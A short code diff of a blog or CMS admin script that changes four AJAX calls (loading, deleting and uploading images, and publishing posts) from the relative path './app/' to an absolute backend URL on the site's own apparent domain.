@@ -37,7 +37,7 @@ function loadimagesdb() { //load images from server
 	var imgreas = "imgreas";
     $.ajax({
 		type: "POST",
-		url: "./app/", 
+		url: "https://mytech.cu.ma/app/", 
 		dataType: "json",
 		//"timeout": 10000,
 		data: {olaprium: olaprium, auth_ola: auth_ola, imgreas: imgreas},
@@ -132,7 +132,7 @@ function pushimagegDelete(rzqm) { //delete image
 	var delid = rzqm;
             $.ajax({
                 type: "POST",
-                url: "./app/",
+                url: "https://mytech.cu.ma/app/",
                 dataType: 'json',
                 data: {olaprium: olaprium, auth_ola: auth_ola, delid: delid},
                 success: function(deleteData){
@@ -260,7 +260,7 @@ function uploadFile(){ //upload image(s) to erver
 		ajax.addEventListener("load", completeHandler, false);
 		ajax.addEventListener("error", errorHandler, false);
 		ajax.addEventListener("abort", abortHandler, false);
-		ajax.open("POST", "./app/");
+		ajax.open("POST", "https://mytech.cu.ma/app/");
 		ajax.send(formdata);
 	}
 	
@@ -447,7 +447,7 @@ function pushPost(oiue, categryofpst){
 			
 			$.ajax({
 				type: "POST",
-				url: "./app/", 
+				url: "https://mytech.cu.ma/app/", 
 				dataType: "json",
 				data: {olaprium: olaprium, auth_ola: auth_ola, featureimageinput: featureimageinput, title: title, categryofpst: categryofpst, messg: messg, pagestrip: pagestrip, topwhat: topwhat, oiue:oiue, pgdero:pgdero},
 				success: function(data){
